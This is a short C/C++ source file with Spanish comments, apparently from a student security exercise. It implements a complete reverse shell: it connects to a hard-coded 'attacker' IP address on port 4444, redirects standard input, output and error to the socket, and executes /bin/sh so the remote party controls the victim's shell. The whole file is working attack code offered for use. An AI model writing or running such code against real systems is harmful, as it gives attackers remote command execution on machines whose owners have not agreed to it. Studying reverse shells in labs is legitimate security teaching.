#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) {
    int sockt;
    int port = 4444; // Puerto definido por el estudiante 
    struct sockaddr_in revsockaddr;

    // 1. Creación del socket TCP 
    sockt = socket(AF_INET, SOCK_STREAM, 0);

    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("192.168.1.204"); // IP del Atacante

    // 2. Conexión saliente hacia la IP definida 
    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));

    // 3. Duplicación de descriptores de archivo (Reverse Shell) 
    // Redirige stdin, stdout y stderr al socket
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    // 4. Ejecución del shell en la víctima 
    char* const argv[] = { const_cast<char*>("/bin/sh"), NULL};
    execve("/bin/sh", argv, NULL);

    return 0;
}
